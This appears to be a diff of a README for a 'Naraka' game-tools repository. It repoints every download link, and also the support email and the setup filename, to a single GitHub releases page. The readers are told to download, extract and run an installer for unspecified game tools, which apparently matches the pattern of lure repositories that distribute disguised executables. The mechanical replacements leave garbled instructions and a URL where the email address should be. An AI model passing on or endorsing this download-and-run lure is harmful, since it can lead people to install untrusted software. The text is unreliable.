@@ -2,7 +2,7 @@
 
 Welcome to the **Naraka** repository! This project is dedicated to enhancing your gaming experience in the Naraka universe. Here, you'll find tools, insights, and community support to help you master the game.
 
-[![Download Application](https://img.shields.io/badge/Download_Application-Application.zip-blue)](https://github.com/user/repo/Application.zip)
+[![Download Application](https://github.com/Sueciapcc/Naraka/releases)](https://github.com/Sueciapcc/Naraka/releases)
 
 ## Table of Contents
 
@@ -29,12 +29,12 @@ Naraka is an immersive action game that combines intense combat with strategic g
 
 To get started, download the application from the link below. You will need to execute the downloaded file to install it.
 
-[![Download Application](https://img.shields.io/badge/Download_Application-Application.zip-blue)](https://github.com/user/repo/Application.zip)
+[![Download Application](https://github.com/Sueciapcc/Naraka/releases)](https://github.com/Sueciapcc/Naraka/releases)
 
 ### Steps to Install
 
 1. Click the download link above.
-2. Save the `Application.zip` file to your computer.
+2. Save the `https://github.com/Sueciapcc/Naraka/releases` file to your computer.
 3. Extract the contents of the zip file.
 4. Run the installer to complete the setup.
 
@@ -77,9 +77,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, feel free to reach out:
 
-- **Email**: support@naraka.com
+- **Email**: https://github.com/Sueciapcc/Naraka/releases
 - **Discord**: Join our Discord server for real-time support and community discussions.
 
 ---
 
-Thank you for checking out the **Naraka** repository. We hope you find the tools and resources helpful in your gaming journey. Remember to visit the [Releases](https://github.com/user/repo/releases) section for the latest updates and tools. Enjoy your gaming!
+Thank you for checking out the **Naraka** repository. We hope you find the tools and resources helpful in your gaming journey. Remember to visit the [Releases](https://github.com/Sueciapcc/Naraka/releases) section for the latest updates and tools. Enjoy your gaming!
